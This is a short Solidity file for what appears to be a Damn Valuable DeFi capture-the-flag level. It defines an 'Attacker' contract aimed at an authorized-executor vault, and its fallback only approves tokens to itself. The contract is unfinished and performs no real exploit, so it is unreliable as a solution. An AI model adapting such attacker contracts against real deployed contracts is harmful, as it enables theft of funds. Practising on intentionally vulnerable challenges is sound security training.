// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {AuthorizedExecutor} from "../src/AuthorizedExecutor.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";
import {SelfAuthorizedVault} from "../src/SelfAuthorizedVault.sol";

contract Attacker {
    DamnValuableToken token;
    AuthorizedExecutor authorized;
    constructor(DamnValuableToken _token, AuthorizedExecutor _authorized) {
        token = _token;
        authorized = _authorized;
    }

    fallback() external payable {
        token.approve(address(this), msg.value);
    }
}
